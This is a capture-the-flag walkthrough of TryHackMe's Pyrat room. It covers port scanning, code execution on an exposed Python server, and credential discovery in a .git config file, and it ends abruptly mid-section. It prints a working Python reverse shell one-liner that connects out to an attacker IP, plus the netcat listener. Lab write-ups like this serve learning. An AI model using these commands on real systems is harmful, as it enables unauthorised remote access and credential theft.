---
title: Pyrat writeup
difficulty: Easy
author: 0xray1e
date: 2026-02-26T15:52:00.000+03:00
description: A walkthrough of TryHackMe's boot-to-root Pyrat room.
categories:
  - Boot to Root
  - TryHackMe
tags: []
---
## Room Description

[Pyrat room in TryHackMe](https://tryhackme.com/room/pyrat)

Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.

## Recon

First, I started with an nmap scan.

`nmap -Pn -T4 10.67.166.0`

![](/assets/img/uploads/Pasted image 20260221151604.png "TCP ports nmap scan")

This returned port 22 used for ssh and port 8000 for HTTP. I ran a script on the http port to get more information on what was running there.

`nmap -sC -sV -p8000 10.67.166.0`

![port 8000 nmap scan](/assets/img/uploads/Pasted image 20260221151729.png "port 8000 nmap scan")

The above response showed that this is a Python server. I started a netcat connection to access the server.

`nc 10.67.175.146 8000`

## Initial Acess

Trying to do directory listing did not help, but after some exploring, I realised that the server can process Python commands.

![python command](/assets/img/uploads/Pasted image 20260221174142.png "python command")

Using this, I spawned a Python-based reverse shell.

`import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.141.57",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")`

Listened on port 4444 on my machine.

`nc -nvlp 4444`

Once the shell is spawned and after some exploring, I found myself in the `var` directory where I could read the contents of `mail.` 

![email conten](/assets/img/uploads/Pasted image 20260221182446.png "email content")

The email is from `root`user to `think` referring to a RAT installed from think's github page. I decided to check whether there was a .git folder in the system. This lead me to `/opt/dev/.git`. A .git folder stores everything needed to keep track of changes made to a project. This includes, config file which contains email aliases, name, authentication credentials, a log of all the commits made, git objects (a hash key pointing to a commit), etc.

`/opt/dev/.git/config` file has Think's credentials, which I used to login and obtain user flag.

![Think's credentials](/assets/img/uploads/Pasted image 20260224135920.png "Think's credentials")

![login as Think](/assets/img/uploads/Pasted image 20260224140020.png "Think login")

Get user.txt

![user.txt flag](/assets/img/uploads/Pasted image 20260224140145.png "user.txt flag")

Now that I had permissions, I was curious to know what was in the git project. This is where the [git objects](https://git-scm.com/book/en/v2/Git-Internals-Git-Objects.html) come in handy. An object is basically a hashed key which points to a commit. This objects can be found in the objects folder where the full object is the fodler name as the key inside it. For example, in this case the full object key is `0a3c36d66369fd4b07ddca72e5379461a63470bf`. 

![]()

x
